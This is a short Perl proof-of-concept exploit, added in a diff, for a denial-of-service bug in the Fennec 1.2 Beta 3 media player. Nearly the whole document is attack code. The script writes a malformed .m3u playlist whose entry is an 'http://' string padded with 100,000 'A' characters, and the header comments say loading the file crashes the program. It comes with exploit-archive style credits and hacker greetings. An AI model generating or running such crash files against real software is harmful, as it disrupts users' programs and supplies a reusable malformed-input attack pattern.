@@ -1,0 +1,14 @@
+# Exploit Title: Fennec 1.2 Beta 3 Denial of Service Vulnerability
+# Author: d4rk-h4ck3r
+# Date: 2010-08-19
+# Software Link: http://www.brothersoft.com/fennec-download-161571.html
+# Greetz 2 : PASSEWORD , MadjiX , KAiSER-J , sec4ever , tli7a , All Tun!Sian h4ck3rz
+# Tested on: Windows XP SP3 Fr
+# Go to Show conversation add your .m3u file , click start and then boooooooooom ;)
+
+
+my $hd = "#EXTM3U\n";
+my $jnk="http://"."\x41" x 100000 ;
+open(MYFILE,'>>d4rk.m3u');
+print MYFILE $hd.$jnk;
+close(MYFILE);
